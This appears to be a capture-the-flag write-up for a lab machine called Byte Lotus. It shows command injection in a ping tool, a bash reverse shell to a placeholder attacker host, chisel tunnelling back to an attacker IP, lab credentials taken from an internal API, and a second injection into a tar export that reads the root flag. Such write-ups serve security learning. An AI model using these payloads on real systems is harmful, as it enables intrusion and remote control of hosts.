# Getting started

Looking through the source code, we find /static/app.js

Which contains
```
// Byte Lotus front-end bootstrap.
// TODO(ops): the staff connectivity tool at /status posts to the legacy
// /internal/netcheck handler. Keep it out of the public nav until the new
// auth gateway ships. Disallowed in robots.txt for now.
console.log("Stay Noticed\u2122");
```
Something about a disallow entry in robot.txt
<br>
<br>

# Gaining shell
Going to /status, we find some legacy pinging type feature, used to ping any domain passed to it (including localhost)

But pinging isn't what we want, try passing
```
localhost'
```
with the ' and notice the /bin/sh error, this tells us the app passes our input straight to some backend bash script

Revshell with
```
$(bash -c 'bash -i >& /dev/tcp/Lhost/Lport 0>&1')
```
User flag at
```
/home/web/user.txt
```
<br>
<br>

# Path to escalation

Get all listenning services on the target box with

```
ss -tulnp
```
Use chisel 
```bash
wget -q https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz -O /tmp/chisel.gz \
gunzip /tmp/chisel.gz \
chmod +x /tmp/chisel
```
Bind with:
on Target Machine
```
./chisel client <YOUR_ATTACKER_IP>:8080 R:8040:127.0.0.1:8080
```
On Attack Box
```
chisel server -p 8080 --reverse
```
To bind local services on the target machine back to ours

Curling http://127.0.0.1:3000 while on the target box, we find
```
/api/health
/api/config
```
Creds in /api/config

```
username: FreePBXUCPTemplateCreator
password: St4yN0t1c3d_2026
email: admin@bytelotus.local <--- in PBx dashboard
```
While in the PBX dashboard, click the plus icon to add a new voice mail, found.
```
"Automation Key cc_auto_7b3f9a1c4e0d2f6a" <9000>
```
<br>
<br>

# Getting the root flag

with that, map another chisel instance on 127.0.0.1:9000 in the target box to our machine with;
```
./chisel client 192.168.130.228:8080 R:9000:127.0.0.1:9000
```
Now, open burp and use open browser

Navigate to http://127.0.0.1:9000 and add the headers
```
Authorization: Bearer cc_auto_7b3f9a1c4e0d2f6a
Content-Type: application/json
```
This endpoint ask for reports, so we pass it
```
{
  "report": "{cmd}"
}
```
Notice how our input to report is reflected to 
```
tar czf /var/automation/exports/{OurCmd}.tgz /var/automation/data 2>&1
```

Classic RCE, comment out the rest of the tar command with # and inject the payload
```
{
  "report": "1; cat /root/root.txt #"
}
```


